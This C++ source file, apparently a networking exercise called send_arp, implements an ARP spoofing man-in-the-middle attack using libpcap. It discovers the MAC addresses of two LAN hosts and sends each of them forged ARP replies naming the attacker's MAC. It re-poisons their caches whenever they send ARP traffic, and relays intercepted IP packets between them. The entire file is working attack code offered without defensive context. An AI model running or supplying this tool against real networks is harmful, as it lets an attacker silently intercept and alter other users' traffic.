#include <pcap.h>			// pcap*()
#include <cstring>			// memcpy()
#include <cstdint>			// uintN_t
#include <arpa/inet.h>			// ntoh()
#include <netinet/in_systm.h>		// ETH,ARP header
#include <libnet/libnet-macros.h>	// ETH,ARP header
#include <libnet/libnet-headers.h>	// ETH,ARP header
#include <sys/ioctl.h>			// local mac_ip
#include <net/if.h>			// local mac_ip
#include <unistd.h>			// [socket]close()
#include <iostream>
using namespace std;

#define INET_ADDR_LEN	4
#define ALL_F 		"\xff\xff\xff\xff\xff\xff"
#define ALL_0 		"\x00\x00\x00\x00\x00\x00"

#define ETH_ADDRSTRLEN	18


#pragma pack(push, 1)
struct arp_hdr : public libnet_arp_hdr
{
    uint8_t sha[ETHER_ADDR_LEN];	/* Sender hardware address.  */
    uint32_t sip;			/* Sender IP address.  */
    uint8_t tha[ETHER_ADDR_LEN];	/* Target hardware address.  */
    uint32_t tip;			/* Target IP address.  */
};
#pragma pack(pop)

pcap_t* handle;

uint8_t* ether_ntop(uint8_t *src, uint8_t *dst, int size) {
	static const char fmt[] = "%02X-%02X-%02X-%02X-%02X-%02X";
	char tmp[sizeof "FF-FF-FF-FF-FF-FF"];
	if(sprintf(tmp, fmt, src[0],src[1],src[2],src[3],src[4],src[5])>size)
		return (NULL);
	memcpy(dst, tmp, size);
	return (dst);
}

int get_ifi(char *dev, uint8_t *mac, uint32_t *ip); // get interface information
void make_eth(struct libnet_ethernet_hdr *eth, uint8_t *src, uint8_t *dst);
void make_arp(arp_hdr *arp, uint16_t op, uint8_t *sha, uint32_t sip, uint8_t *tha, uint32_t tip);
void make_pkt(uint8_t *pkt, struct libnet_ethernet_hdr *eth, arp_hdr *arp);
void arp_req(uint8_t *my_mac, uint32_t my_ip, uint8_t *target_mac, uint32_t target_ip);
void arp_rep(uint8_t *my_mac, uint32_t sender_ip, uint8_t *target_mac, uint32_t target_ip);


void usage() {
	printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
	printf("sample: send_arp eth0 10.1.1.2 10.1.1.1\n");
}
 
int main(int argc, char *argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
 
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	uint8_t my_mac[ETHER_ADDR_LEN];
	uint32_t my_ip, sender_ip, target_ip;
	if(get_ifi(dev, my_mac, &my_ip)) {
		fprintf(stderr, "Error: Get host’s information failed\n");
		return -1;
	}

	if(inet_pton(AF_INET, (char*)argv[2], &sender_ip) == 0 ||
	   inet_pton(AF_INET, (char*)argv[3], &target_ip) == 0) {
		fprintf(stderr, "Error: Sender ip or Target ip check it\n");
		return -1;
	}
	uint8_t ip_buf[INET_ADDRSTRLEN];
	cout<<inet_ntop(AF_INET, &sender_ip, (char*)ip_buf, INET_ADDRSTRLEN)<<endl;
	cout<<inet_ntop(AF_INET, &target_ip, (char*)ip_buf, INET_ADDRSTRLEN)<<endl;
	cout<<inet_ntop(AF_INET, &my_ip, (char*)ip_buf, INET_ADDRSTRLEN)<<endl;

	uint8_t sender_mac[ETHER_ADDR_LEN];
	arp_req(my_mac, my_ip, sender_mac, sender_ip);

	uint8_t eth_buf[ETH_ADDRSTRLEN];
	cout << "sender_MAC \t : " << ether_ntop(sender_mac, eth_buf, ETH_ADDRSTRLEN) << endl;

	uint8_t target_mac[ETHER_ADDR_LEN];
	arp_req(my_mac, my_ip, target_mac, target_ip);

	arp_rep(my_mac, target_ip, sender_mac, sender_ip);
	arp_rep(my_mac, sender_ip, target_mac, target_ip);

	struct libnet_ethernet_hdr eth, *eth_p;
	arp_hdr arp, *arp_p;
	while(1) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		eth_p = (struct libnet_ethernet_hdr*)packet;
		arp_p = (arp_hdr*)(packet + LIBNET_ETH_H);
		if(ntohs(eth_p->ether_type) == ETHERTYPE_ARP) {
			if(!memcmp(eth_p->ether_shost, sender_mac, ETHER_ADDR_LEN)) // arp_sender_req
				arp_rep(my_mac, target_ip, sender_mac, sender_ip);
			else if(!memcmp(eth_p->ether_shost, target_mac, ETHER_ADDR_LEN)) // arp_target_req
				arp_rep(my_mac, sender_ip, target_mac, target_ip);
			continue;
		}
		else if(ntohs(eth_p->ether_type) != ETHERTYPE_IP || // !SpoofPacket = continue;
			arp_p->tip == my_ip ||
			memcmp(eth_p->ether_dhost, my_mac, ETHER_ADDR_LEN)) continue;

		if(!memcmp(eth_p->ether_shost, sender_mac, ETHER_ADDR_LEN)) // sm = sm
			memcpy(eth_p->ether_dhost, target_mac, ETHER_ADDR_LEN);
		else if(!memcmp(eth_p->ether_shost, target_mac, ETHER_ADDR_LEN)) // sm = tm
			memcpy(eth_p->ether_dhost, sender_mac, ETHER_ADDR_LEN);
		memcpy(eth_p->ether_shost, my_mac, ETHER_ADDR_LEN);
		pcap_sendpacket(handle, packet, header->caplen);

		cout<<"relay\n";
	}
	pcap_close(handle);
	return 0;
}

int get_ifi(char *dev, uint8_t *mac, uint32_t *ip) {
	int reqfd;
	struct ifreq ifr;

	reqfd = socket(AF_INET, SOCK_DGRAM, 0);
	strcpy(ifr.ifr_name, dev);

	// local-mac
	if(ioctl(reqfd, SIOCGIFHWADDR, &ifr) != 0) return 1;
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);

	// local-ip
	if(ioctl(reqfd, SIOCGIFADDR, &ifr) != 0) return 1;
	memcpy(ip, (uint32_t*)&((struct sockaddr_in*)(&ifr.ifr_addr))->sin_addr, INET_ADDR_LEN);

	close(reqfd);
	return 0;
}

void make_eth(struct libnet_ethernet_hdr *eth, uint8_t *src, uint8_t *dst) {
	memcpy(eth->ether_dhost, dst, ETHER_ADDR_LEN);
	memcpy(eth->ether_shost, src, ETHER_ADDR_LEN);
	eth->ether_type = htons(ETHERTYPE_ARP);
}

void make_arp(arp_hdr *arp, uint16_t op, uint8_t *sha, uint32_t sip, uint8_t *tha, uint32_t tip) {
	arp->ar_hrd = htons(ARPHRD_ETHER);
	arp->ar_pro = htons(ETHERTYPE_IP);
	arp->ar_hln = ETHER_ADDR_LEN;
	arp->ar_pln = INET_ADDR_LEN;
	arp->ar_op = htons(op);
	memcpy(arp->sha, sha, ETHER_ADDR_LEN);
	arp->sip = sip;
	memcpy(arp->tha, tha, ETHER_ADDR_LEN);
	arp->tip = tip;
}

void make_pkt(uint8_t *pkt, struct libnet_ethernet_hdr *eth, arp_hdr *arp) {
	memcpy(pkt, eth, LIBNET_ETH_H);
	memcpy(pkt+LIBNET_ETH_H, arp, LIBNET_ARP_ETH_IP_H);
}
 
void arp_req(uint8_t *my_mac, uint32_t my_ip, uint8_t *target_mac, uint32_t target_ip) {
	struct libnet_ethernet_hdr eth, *eth_p;
	arp_hdr arp, *arp_p;
	uint8_t merge[LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H];

	make_eth(&eth, my_mac, (uint8_t*)ALL_F);
	make_arp(&arp, ARPOP_REQUEST, my_mac, my_ip, (uint8_t*)ALL_0, target_ip);
	make_pkt(merge, &eth, &arp);
	pcap_sendpacket(handle, merge, LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H);

	while(1) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		eth_p = (struct libnet_ethernet_hdr*)packet;
		arp_p = (arp_hdr*)(packet + LIBNET_ETH_H);
		if(ntohs(eth_p->ether_type) == ETHERTYPE_ARP && arp_p->sip == arp.tip) {
			memcpy(target_mac, arp_p->sha, ETHER_ADDR_LEN);
			break;
		}
	}
}

void arp_rep(uint8_t *my_mac, uint32_t sender_ip, uint8_t *target_mac, uint32_t target_ip) {
	struct libnet_ethernet_hdr eth, *eth_p;
	arp_hdr arp, *arp_p;
	uint8_t merge[LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H];

	make_eth(&eth, my_mac, target_mac);
	make_arp(&arp, ARPOP_REPLY, my_mac, sender_ip, target_mac, target_ip);
	make_pkt(merge, &eth, &arp);
	pcap_sendpacket(handle, merge, LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H);
}
